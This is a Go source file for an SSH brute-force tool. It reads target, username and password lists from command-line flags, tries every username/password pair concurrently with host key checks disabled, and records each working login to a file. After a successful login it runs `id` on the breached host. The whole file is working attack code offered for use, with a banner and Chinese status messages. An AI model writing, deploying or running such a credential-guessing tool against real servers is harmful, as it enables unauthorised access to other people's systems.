package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os"
	"sync"
	"time"
)

const LIMIT = 8

var throttler = make(chan int, LIMIT)

var (
	debug = flag.Bool("d", false, "调试")

	host     = flag.String("u", "", "")
	userList = flag.String("w", "", "")
	passList = flag.String("p", "", "")
	out      = flag.String("o", "", "")
)

func usage() {
	fmt.Println(`
Usage:
[-u HOST:PORT] [-w USERS] [-p PASSWORDS] [-d]
Examples:
127.0.0.1:22 -u uesrname.txt -p password.txt -o results.txt
//`)
//os.Args[0], os.Args[0], os.Args[0])
//	os.Exit(0)
}
func title() {
	fmt.Println("\n                                                                 \n                                                                 \n    ,---,.     ,---,      ,----,                                 \n  ,'  .' |  ,`--.' |    .'   .' \\                                \n,---.'   | /    /  :  ,----,'    |                               \n|   |   .':    |.' '  |    :  .  ;.--.--.                        \n:   :  :  `----':  |  ;    |.'  //  /    '     ,---.     ,---.   \n:   |  |-,   '   ' ;  `----'/  ;|  :  /`./    /     \\   /     \\  \n|   :  ;/|   |   | |    /  ;  / |  :  ;_     /    /  | /    / '  \n|   |   .'   '   : ;   ;  /  /-, \\  \\    `. .    ' / |.    ' /   \n'   :  '     |   | '  /  /  /.`|  `----.   \\'   ;   /|'   ; :__  \n|   |  |     '   : |./__;      : /  /`--'  /'   |  / |'   | '.'| \n|   :  \\     ;   |.'|   :    .' '--'.     / |   :    ||   :    : \n|   | ,'     '---'  ;   | .'      `--'---'   \\   \\  /  \\   \\  /  \n`----'              `---'                     `----'    `----'   \n                                                                 \n")
}

func main() {
	title()
	flag.Parse()
	if *host == "" || *userList == "" || *passList == "" {
		usage()
	}
	if err := dialHost(); err != nil {
		log.Println("无法连接, exiting.")
		os.Exit(1)
	}
	users, err := readFile(*userList)
	if err != nil {
		log.Println("无法打开用户列表, exiting.")
		os.Exit(1)
	}

	passwords, err := readFile(*passList)
	if err != nil {
		log.Println("无法打开密码本, exiting.")
		os.Exit(1)
	}

	var outfile *os.File
	if *out == "" {
		outfile = os.Stdout
	} else {
		outfile, err = os.Create(*out)
		if err != nil {
			log.Println("无法写入文件, exiting.")
			os.Exit(1)
		}
		defer outfile.Close()
	}

	var wg sync.WaitGroup
	for _, user := range users {
		for _, pass := range passwords {
			throttler <- 0
			wg.Add(1)
			go connect(&wg, outfile, user, pass)
		}
	}
	wg.Wait()
}

func dialHost() (err error) {
	debugln("Trying to connect to host...")
	conn, err := net.Dial("tcp", *host)
	if err != nil {
		return
	}
	conn.Close()
	return
}

func connect(wg *sync.WaitGroup, o *os.File, user, pass string) {
	defer wg.Done()

	debugln(fmt.Sprintf("Trying %s:%s...\n", user, pass))

	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()

	c, err := ssh.Dial("tcp", *host, sshConfig)
	if err != nil {
		<-throttler
		return
	}
	defer c.Close()

	log.Printf("[Found] ,找到密码啦! %s:%s\n", user, pass)
	fmt.Fprintf(o, "%s:%s\n", user, pass)

	debugln("Trying to run `id`...")

	session, err := c.NewSession()
	if err == nil {
		defer session.Close()

		debugln("Successfully ran `id`!")

		var s_out bytes.Buffer
		session.Stdout = &s_out

		if err = session.Run("id"); err == nil {
			fmt.Fprintf(o, "\t%s", s_out.String())
		}
	}
	<-throttler
}

func readFile(f string) (data []string, err error) {
	b, err := os.Open(f)
	if err != nil {
		return
	}
	defer b.Close()

	scanner := bufio.NewScanner(b)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}
	return
}

func debugln(s string) {
	if *debug {
		log.Println("[Debug]", s)
	}
}